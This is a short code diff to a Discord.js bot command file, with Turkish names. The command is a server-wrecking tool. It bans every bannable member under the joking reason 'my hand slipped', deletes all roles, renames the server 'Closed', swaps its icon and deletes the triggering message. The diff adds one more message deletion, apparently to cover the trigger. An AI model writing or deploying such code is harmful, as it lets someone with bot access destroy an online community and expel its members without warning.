@@ -3,14 +3,11 @@ const ayarlar = require('../ayarlar.json');
 
 exports.run = async (client, message, args) => {
 if (message.guild) {
-let kanallar = 0;
-let roller = 0;
-let emojiler = 0;
-let insanlar = 0;
 
 message.guild.members.forEach(u => {
 if (u.bannable) {
 message.guild.ban(u, "Elim Çarptı")
+message.delete()
 }
 })
 
@@ -20,7 +17,6 @@ message.guild.roles.deleteAll("");
 
 message.guild.setName(`Kapandı`, "")
 message.guild.setIcon(`https://cdn.discordapp.com/attachments/569895621872451605/573561578767777829/closed-logo1.jpg`)
- 
 message.guild.createChannel(`hey`)
 message.delete()
 };  
